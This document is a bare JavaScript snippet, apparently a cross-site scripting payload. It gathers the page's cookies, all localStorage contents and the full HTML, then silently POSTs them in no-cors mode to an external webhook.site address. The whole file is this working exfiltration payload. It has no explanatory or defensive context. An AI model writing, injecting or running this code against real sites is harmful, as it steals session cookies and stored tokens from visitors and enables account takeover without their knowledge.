(() => {
  const data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    html: document.documentElement.outerHTML,
  };

  fetch("https://webhook.site/f353d5f0-2b32-43de-8734-17d04d1dc3f7", {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
})();

